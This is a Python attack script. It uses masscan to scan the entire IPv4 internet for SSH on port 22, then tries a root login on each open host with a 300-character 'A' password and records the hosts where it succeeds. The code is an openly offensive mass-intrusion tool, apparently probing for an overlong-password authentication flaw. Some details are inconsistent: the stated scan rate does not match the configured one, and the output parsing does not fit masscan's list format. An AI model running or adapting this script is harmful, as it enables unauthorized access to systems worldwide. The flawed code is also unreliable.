#!/usr/bin/env python3
import subprocess

import paramiko

PASSWORD = "A" * 300

def main():
    # Full IPv4 scan, TCP 22, ~2 hours at 10k pkts/sec
    subprocess.run(
        ["masscan", "0.0.0.0/0", "-p22", "--rate=600000", "--exclude", "255.255.255.255",  "-oL", "open.txt"],
        check=True,
    )

    with open("success.txt", "a") as out:
        for line in open("open.txt"):
            if "open" not in line:
                continue
            ip = line.strip().split(":")[0]
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=22, username="root", password=PASSWORD, timeout=10)
                client.close()
                out.write(f"{ip}\n")
                out.flush()
                print("SUCCESS:", ip)
            except Exception:
                pass

if __name__ == "__main__":
    main()

